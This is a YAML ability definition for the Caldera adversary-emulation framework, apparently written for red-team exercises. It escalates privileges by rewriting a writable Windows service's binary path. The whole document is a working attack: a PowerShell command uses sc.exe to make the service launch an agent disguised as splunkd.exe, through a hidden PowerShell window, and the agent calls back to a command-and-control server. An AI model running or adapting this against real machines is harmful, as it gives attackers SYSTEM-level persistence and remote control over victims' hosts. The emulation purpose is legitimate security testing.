- id: c9a0e6b8-9e5c-4b6a-9a9c-29e87f8d6e3e
  name: Privilege Escalation - Modify Service for Fileless Payload
  description: Exploits a writable service by reconfiguring its binary path to launch the Caldera agent via a hidden PowerShell window. Creates a fact upon successful modification.
  tactic: privilege-escalation
  technique:
    attack_id: T1574.011
    name: "Hijack Execution Flow: Services File Permissions Weakness"
  requirements:
    - plugins.stockpile.app.requirements.existential:
      - source: service.name.writable
  platforms:
    windows:
      psh:
        command: |
          $escalatedGroup = "red_system";
          $agentCmd = "'C:\Users\Public\splunkd.exe -server #{server} -group $($escalatedGroup)'";
          $binPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c $($agentCmd)";
          sc.exe config #{service.name.writable} binPath= "$($binPath)";
        parsers:
          plugins.adversary_emulation.app.parsers.regex_parser:
            # This parser looks for the explicit success message from the sc.exe command.
            - source: 'service.path.modified'
              custom_parser_vals:
                regex: '\[SC\] ChangeServiceConfig SUCCESS'
                # We will create a fact with the service name as the value for precise chaining.
                fact_source_override: '#{service.name.writable}'
                edge_label: 'has_modified_binpath'